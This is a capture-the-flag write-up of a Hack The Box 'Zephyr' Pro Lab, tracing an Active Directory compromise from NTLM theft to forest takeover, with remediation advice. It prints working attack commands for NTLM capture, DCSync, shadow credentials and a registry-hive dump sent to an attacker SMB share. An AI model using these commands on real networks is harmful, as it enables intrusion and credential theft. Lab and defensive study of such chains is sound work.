# RedMind Technical Report — Zephyr (HTB Pro Lab)

**Lab:** Zephyr Pro Lab · **Domains:** PAINTERS.HTB, ZSM.LOCAL, INTERNAL.ZSM.LOCAL · **OS:** Windows / Linux Mixed · **Date (lab):** 2026-03-24

## Executive summary

Gained initial access to the PAINTERS.HTB domain through NTLM theft via a malicious PDF upload on a public web application. Post-exploitation involved multi-stage pivoting through Linux mail servers and Windows workstations, eventually achieving Domain Admin via constrained delegation and DCSync. The attack then transitioned to the ZSM.LOCAL forest via a Zabbix SAML bypass and expanded into the INTERNAL.ZSM.LOCAL child domain. Final forest dominance was achieved through a combination of shadow credentials, remote registry backups for credential extraction, and a RaiseChild attack to forge a Golden Ticket for the parent forest root.

- Foothold: NTLM theft via PDF upload (user `riley`).
- Escalation: Constrained Delegation (PAINTERS), SAML Bypass (ZSM), and Shadow Credentials (INTERNAL).
- Impact: Full forest compromise across three distinct Active Directory environments and total infrastructure control.

## Attack chain summary

1. Perimeter Recon: Identified an active PDF review process on `painters.htb`.
2. Initial Foothold: Captured and cracked NTLMv2 hashes via malicious PDF upload.
3. Lateral Movement: Pivoted through a Linux mail server to access the internal 110.0/24 subnet.
4. Domain Escalation: Abused Constrained Delegation on `PAINTERS\blake` to perform a DCSync.
5. Forest Pivot: Exploited CVE-2022-23131 (Zabbix) to jump into the ZSM.LOCAL forest.
6. Child Domain Compromise: Used Shadow Credentials and Remote Registry Dumps to compromise `internal.zsm.local`.
7. Forest Dominance: Executed a RaiseChild attack to gain DA on the ZSM.LOCAL forest root.

## Technical breakdown

### 1. Initial Access: painters.htb

Initial enumeration of the web application revealed a review system for employment applications. A malicious PDF was generated using `ntlm_theft` to force SMB authentication back to the attacker infrastructure.

```bash
# Generate malicious PDF
python ntlm_theft.py -g all -s 10.10.14.26 -f painter

# Capture hash using Responder
sudo responder -I tun0 -dwv
```

The payload was uploaded to `https://painters.htb/listing?id=1`. The captured NTLMv2 hash for `PAINTERS\riley` was cracked using `rockyou.txt` to reveal the password `P[REDACTED]d`.

### 2. Pivoting through PAINTERS.HTB

Using `riley` credentials, a foothold was established on the `PNT-MAIL` server. Local enumeration of `/var/www/painter/models/DatabaseModel.php` revealed hardcoded database credentials (`riley : P[REDACTED]2`).

A **Ligolo-ng** tunnel was established to route traffic into the `192.168.110.0/24` subnet. Riley's credentials were reused to access `WORKSTATION-1` via WinRM, where an automation script revealed administrative credentials for the portal: `M[REDACTED]#`.

### 3. Achieving Domain Admin (PAINTERS)

Targeted Kerberoasting identified the `web_svc` account. The cracked credentials for `web_svc` (`![REDACTED]z`) provided local admin access to `PNT-SVRSVC`.

BloodHound identified a chain of ACL abuse:

1. User `James` had local admin on `PNT-SVRBPA`.
2. `James` possessed `ForceChangePassword` rights over `blake`.
3. `blake` had Constrained Delegation (`AllowedToDelegateTo`) rights for the `CIFS` service on the DC.

Blake's password was reset using Mimikatz, and a service ticket was requested to impersonate the Domain Administrator:

```bash
# Request impersonated ticket
getST.py painters.htb/blake:'P[REDACTED]6' -spn CIFS/dc.painters.htb -impersonate administrator -altservice 'cifs'

# DCSync execution
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass 'painters.htb/administrator'@dc.painters.htb
```

This yielded the root flag on the mail server after escalating via `sudo` as user `matt`.

### 4. Forest Jump: ZSM.LOCAL

A secondary Ligolo-ng tunnel was established into the `192.168.210.0/24` network. The Zabbix server was found vulnerable to a SAML authentication bypass (CVE-2022-23131).

1. **Authentication Bypass:** A forged session cookie provided Admin access to the Zabbix dashboard.
2. **Reverse Shell:** A custom script was executed via the Zabbix monitoring agent to gain a shell as `zabbix`.
3. **Privilege Escalation:** The `zabbix` user was found to have `sudo` permissions for `nmap`. A Lua script was used to gain root.

### 5. Domain Dominance: INTERNAL.ZSM.LOCAL

User `marcus` (credentials cracked from the Zabbix DB) had `AddCredentialLink` permissions on `MGMT1`. `pyWhisker` was utilized to inject a shadow credential.

```bash
# Inject Shadow Credential
pywhisker -u marcus ... -t "ZPH-SVRMGMT1$" -a add

# Obtain machine account hash
gettgtpkinit.py ... mgmt1.ccache
getnthash.py ... 'zsm.local/ZPH-SVRMGMT1$'
```

The machine account's privileges were used to add `marcus` to the `General Management` group, which granted `ForceChangePassword` rights over `jamie`. `Jamie` then exploited a misconfigured MSSQL service to gain `SA` rights and extract host information.

### 6. Final Forest Takeover

The user `melissa` was identified as a `Backup Operator` in the child domain. A modified `reg.py` script was used to remotely backup the Domain Controller registry hives to an attacker-controlled SMB share.

```bash
# Remote registry dump
python3 reg.py 'internal.zsm.local/melissa':'W[REDACTED]!'@192.168.210.16 backup -p '\\10.10.14.22\share'
```

After extracting the child domain's Administrator hash, a **RaiseChild** attack was executed via `NetExec` to forge a Golden Ticket for the parent forest root (`zsm.local`), resulting in total forest compromise.

## Key findings and remediation summary

- **NTLM Theft via File Upload:** The review system's failure to sanitize or isolate document rendering allowed for NTLM theft. *Remediation: Disable outbound SMB on client workstations and use isolated sandboxes for document rendering.*
- **Overly Permissive ACLs:** High-value accounts were vulnerable to `ForceChangePassword` and `Shadow Credentials` abuse. *Remediation: Audit Active Directory ACLs and implement the Principle of Least Privilege (PoLP).*
- **Vulnerable Management Software:** Outdated Zabbix versions provided a critical pivot point. *Remediation: Ensure all management and monitoring tools are patched and use strong, non-SAML-bypassable authentication.*
- **Privileged Group Membership:** Membership in `Backup Operators` allowed for remote registry extraction. *Remediation: Severely restrict membership in protected groups and enable Protected Users security group for high-value targets.*

## Evidence and artifacts

- PAINTERS Root Flag: `ZEPHYR{[REDACTED]}`
- PAINTERS Administrator Hash: `4f3[REDACTED]554`
- ZSM Administrator Hash: `8421[REDACTED]d44`
- INTERNAL Administrator Hash: `543b[REDACTED]0d5e`

## Reflection

The Zephyr lab demonstrates the complexity of modern Active Directory environments. The most critical lesson was the power of "Identity-based pivoting" over simple exploit-based movement. By understanding the relationship between users and machine accounts (Shadow Credentials) and the trust boundaries between child and parent domains, a single captured credential can lead to a total forest collapse. The RaiseChild attack, in particular, highlights the inherent risks in AD Forest trust architectures.